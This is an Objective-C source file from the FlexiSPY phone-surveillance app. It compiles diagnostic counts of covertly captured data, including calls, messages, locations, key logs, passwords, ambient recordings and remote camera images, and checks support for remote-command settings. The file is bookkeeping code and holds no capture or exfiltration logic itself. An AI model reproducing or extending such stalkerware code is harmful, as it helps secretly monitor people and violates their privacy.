//
//  Utils.m
//  FlexiSPY
//
//  Created by Dominique  Mayrand on 12/6/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "Utils.h"
#import "MobileSPYAppDelegate.h"

#import "PhoneInfo.h"
#import "ConfigurationManager.h"
#import "DbHealthInfo.h"
#import "EventCount.h"
#import "DetailedCount.h"
#import "LicenseInfo.h"
#import "RemoteCmdCode.h"

//static NSString *kDeviceModel		= @"Device Model";
//static NSString *kCallLogEvent		= @"Call";
//static NSString *kSMSEvent			= @"SMS";
//static NSString *kIMEvent			= @"IM";
//static NSString *kMMSEvent			= @"MMS";
//static NSString *kEmailEvent		= @"Email";
//static NSString *kLocationEvent		= @"Location";
//static NSString *kAddressBookEvent	= @"Address Book";
//static NSString *kThumbnailEvent	= @"Thumbnail";
//static NSString *kSystemEvent		= @"System";
//static NSString *kSettingsEvent		= @"Set-Settings";
//static NSString *kBookmarkEvent		= @"Bookmark";
//static NSString *kBrowserUrlEvent	= @"Browser URL";
//static NSString *kLastConnectionTime= @"Last Connection Time";
//static NSString *kCountryCode		= @"Country Code";
//static NSString *kNetworkCode		= @"Network Code";
//static NSString *kNetworkName		= @"Network Name";
//static NSString *kDatabaseSize		= @"Database Size (bytes)";
//static NSString *kDatabaseDropCount	= @"Database Drop Count";
//static NSString *kAvailableSize		= @"Available Size (bytes)";

@implementation Utils

+ (NSMutableArray*) getDiagnosticsWithDBHealthInfo: (DbHealthInfo *) aDBHealthInfo
									withEventCount: (EventCount *) aEventCount
							 andLastConnectionTime: (NSString *) aLastConnectionTime {
	DLog(@"---->Enter<----")
	MobileSPYAppDelegate *appDelegate = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
	id <PhoneInfo> phoneInfo = [appDelegate mPhoneInfo];
	id <ConfigurationManager> configurationManager = [appDelegate mConfigurationManager];
	LicenseInfo *licenseInfo = [appDelegate mLicenseInfo];
	
	// Diagnostic are dislayed base on configurations
	NSMutableArray* diags = [[[NSMutableArray alloc] init] autorelease];
	if(diags && ([licenseInfo licenseStatus] == ACTIVATED ||
				 [licenseInfo licenseStatus] == DISABLE ||
				 [licenseInfo licenseStatus] == EXPIRED)){
		// Device model
		DiagnosticObject* dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kDeviceModel", @"") andValue:[phoneInfo getDeviceModel]];
		[diags addObject:dobj];
		[dobj release];
		DLog(@"---->Device model done<----")
		
		// Device UID
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kDeviceUID", @"") andValue:[phoneInfo getIMEI]];
		[diags addObject:dobj];
		[dobj release];
		DLog(@"---->Device UID done<----")
		
		DetailedCount *detailedCount = nil;
		// Call
		BOOL issupport = [configurationManager isSupportedFeature:kFeatureID_EventCall];
		if (issupport) {
			detailedCount = [aEventCount countEvent:kEventTypeCallLog];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kCallLogEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d,%d",[detailedCount inCount], [detailedCount outCount], [detailedCount missedCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Call done<----")
		}
		// SMS
		if ([configurationManager isSupportedFeature:kFeatureID_EventSMS]) {
			detailedCount = [aEventCount countEvent:kEventTypeSms];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kSMSEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->SMS done<----")
		}
		// IM
		if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
			detailedCount = [aEventCount countEvent:kEventTypeIMMessage];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kIMMessageEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
			[diags addObject:dobj];
			[dobj release];
			
			detailedCount = [aEventCount countEvent:kEventTypeIMAccount];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kIMAccountEvent", @"") andValue:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			
			detailedCount = [aEventCount countEvent:kEventTypeIMContact];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kIMContactEvent", @"") andValue:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			
			detailedCount = [aEventCount countEvent:kEventTypeIMConversation];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kIMConversationEvent", @"") andValue:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->IM done<----")
		}
		// MMS
		if ([configurationManager isSupportedFeature:kFeatureID_EventMMS]) {
			detailedCount = [aEventCount countEvent:kEventTypeMms];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kMMSEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->MMS done<----")
		}
		// Email
		if ([configurationManager isSupportedFeature:kFeatureID_EventEmail]) {
			detailedCount = [aEventCount countEvent:kEventTypeMail];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kEmailEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Email done<----")
		}
		// Location
		if ([configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
			detailedCount = [aEventCount countEvent:kEventTypeLocation];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kLocationEvent", @"") andValue:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Location done<----")
		}
		// Browser url
		if ([configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
			detailedCount = [aEventCount countEvent:kEventTypeBrowserURL];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kBrowserUrlEvent", @"") andValue:[NSString stringWithFormat:@"%d", 0]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Browser url done<----")
		}
		// Thumbnail
		if ([configurationManager isSupportedFeature:kFeatureID_EventCameraImage] ||
			[configurationManager isSupportedFeature:kFeatureID_EventWallpaper] ||
			[configurationManager isSupportedFeature:kFeatureID_EventSoundRecording] ||
			[configurationManager isSupportedFeature:kFeatureID_EventVideoRecording] ||
			[configurationManager isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
			detailedCount = [aEventCount countEvent:kEventTypeCameraImage];
			NSInteger image = [detailedCount totalCount];
			detailedCount = [aEventCount countEvent:kEventTypeAudio];
			NSInteger audio = [detailedCount totalCount];
			detailedCount = [aEventCount countEvent:kEventTypeVideo];
			NSInteger video = [detailedCount totalCount];
			detailedCount = [aEventCount countEvent:kEventTypeWallpaper];
			NSInteger wp = [detailedCount totalCount];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kThumbnailEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d,%d,%d", image, audio, video, wp]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Thumbnail done<----")
		}
		// System
		if ([configurationManager isSupportedFeature:kFeatureID_EventSystem]) {
			detailedCount = [aEventCount countEvent:kEventTypeSystem];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kSystemEvent", @"") andValue:[NSString stringWithFormat:@"%d", [detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->System done<----")
		}
		// Settings
		if ([configurationManager isSupportedFeature:kFeatureID_EventSettings]) {
			detailedCount = [aEventCount countEvent:kEventTypeSettings];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kSettingsEvent", @"") andValue:[NSString stringWithFormat:@"%d", [detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Settings done<----")
		}
		// Application life cycle
		if ([configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {
			detailedCount = [aEventCount countEvent:kEventTypeApplicationLifeCycle];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kApplicationLifeCycleEvent", @"") andValue:[NSString stringWithFormat:@"%d", [detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Application life cycle done<----")
		}
		// Ambient recording event
		if ([configurationManager isSupportedFeature:kFeatureID_AmbientRecording]) {
			detailedCount = [aEventCount countEvent:kEventTypeAmbientRecordAudio];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kAmbientRecordingEvent", @"") andValue:[NSString stringWithFormat:@"%d", [detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Ambient recording done<----")
		}
		// Remote camera image event
		if ([configurationManager isSupportedFeature:kFeatureID_RemoteCameraImage]) {
			detailedCount = [aEventCount countEvent:kEventTypeRemoteCameraImage];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kRemoteCameraImageEvent", @"") andValue:[NSString stringWithFormat:@"%d", [detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Remote camera image done<----")
		}		
		// VoIP call log
		if ([configurationManager isSupportedFeature:kFeatureID_EventVoIP]) {
			detailedCount = [aEventCount countEvent:kEventTypeVoIP];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kVoIPLogEvent", @"") andValue:[NSString stringWithFormat:@"%d,%d,%d",[detailedCount inCount], [detailedCount outCount], [detailedCount missedCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->VoIP done<----")
		}
		// Key log
		if ([configurationManager isSupportedFeature:kFeatureID_EventKeyLog]) {
			detailedCount = [aEventCount countEvent:kEventTypeKeyLog];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kKeyLogEvent", @"") andValue:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->KeyLog done<----")
		}
        // Page visited
		if ([configurationManager isSupportedFeature:kFeatureID_EventPageVisited]) {
			detailedCount = [aEventCount countEvent:kEventTypePageVisited];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kPageVisitedEvent", @"") andValue:[NSString stringWithFormat:@"%ld",[detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->PageVisited done<----")
		}
        // Password
		if ([configurationManager isSupportedFeature:kFeatureID_EventPassword]) {
			detailedCount = [aEventCount countEvent:kEventTypePassword];
			dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kPasswordEvent", @"") andValue:[NSString stringWithFormat:@"%ld",[detailedCount totalCount]]];
			[diags addObject:dobj];
			[dobj release];
			DLog(@"---->Password done<----")
		}
		// Last connection time
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kLastConnectionTime", @"") andValue:aLastConnectionTime];
		[diags addObject:dobj];
		[dobj release];
		// Country code
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kCountryCode", @"") andValue:[phoneInfo getMobileCountryCode]];
		[diags addObject:dobj];
		[dobj release];
		// Network code
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kNetworkCode", @"") andValue:[phoneInfo getMobileNetworkCode]];
		[diags addObject:dobj];
		[dobj release];
		// Network name
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kNetworkName", @"") andValue:[phoneInfo getNetworkName]];
		[diags addObject:dobj];
		[dobj release];
		// Database size
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kDatabaseSize", @"") andValue:[NSString stringWithFormat:@"%llu", [aDBHealthInfo mDatabaseSize]]];
		[diags addObject:dobj];
		[dobj release];
		// Database drop count
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kDatabaseDropCount", @"") andValue:[NSString stringWithFormat:@"%d", [aDBHealthInfo dbDropCount]]];
		[diags addObject:dobj];
		[dobj release];
		// Available size
		dobj = [[DiagnosticObject alloc] initWithName:NSLocalizedString(@"kAvailableSize", @"") andValue:[NSString stringWithFormat:@"%llu", [aDBHealthInfo mAvailableSize]]];
		[diags addObject:dobj];
		[dobj release];
	} else {
		// Product not activated
		NSString *licenseStatus = nil;
		if ([licenseInfo licenseStatus] == DEACTIVATED) {
			licenseStatus = NSLocalizedString(@"kCurrentSettingsViewProductNotActivate", @"");
		} else if ([licenseInfo licenseStatus] == DISABLE) {
			licenseStatus = NSLocalizedString(@"kCurrentSettingsViewProductDisabled", @"");
		} else if ([licenseInfo licenseStatus] == EXPIRED) {
			licenseStatus = NSLocalizedString(@"kCurrentSettingsViewProductExpired", @"");
		} else {
			licenseStatus = NSLocalizedString(@"kCurrentSettingsViewProductUnknown", @"");
		}
		
		DiagnosticObject* dobj = [[DiagnosticObject alloc] initWithName:licenseStatus andValue:@""];
		[diags addObject:dobj];
		[dobj release];
	}

	DLog(@"---->End<----")
	return diags;
}

+ (BOOL) isSupportSettingIDOfRemoteCmdCodeSettings: (NSInteger) aSettingID {
    MobileSPYAppDelegate *appDelegate               = (MobileSPYAppDelegate *)[[UIApplication sharedApplication] delegate];
    id <ConfigurationManager> configurationManager  = [appDelegate mConfigurationManager];
    
    BOOL isSupport                                  = [configurationManager isSupportedSettingID:aSettingID
                                                                                     remoteCmdID:kRemoteCmdCodeSetSettings];
    DLog(@"This setting id %ld isSupport ? %d", (long)aSettingID, isSupport)
    return isSupport;
}


@end


@implementation DiagnosticObject

@synthesize mValue, mName;

-(id) initWithName:(NSString*) aName andValue: (NSString*) aValue{
	self = [super init];
	if(self){
		[self setMName:aName];
		[self setMValue:aValue];
	}
	return self;
}

-(void) dealloc{
	[mName release];
	[mValue release];
	[super dealloc];
}

@end
